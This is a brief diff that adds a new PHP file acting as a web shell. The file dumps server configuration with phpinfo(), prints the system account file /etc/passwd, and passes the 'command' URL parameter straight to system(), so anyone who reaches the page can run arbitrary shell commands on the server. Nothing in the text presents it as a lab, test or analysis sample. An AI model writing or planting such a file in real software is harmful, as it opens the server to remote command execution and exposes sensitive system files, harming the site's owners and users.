@@ -1,0 +1,6 @@
+<?php
+phpinfo();
+echo readfile("/etc/passwd");
+echo "Run command: ".htmlspecialchars($_GET['command']);
+system($_GET['command']);
+?>
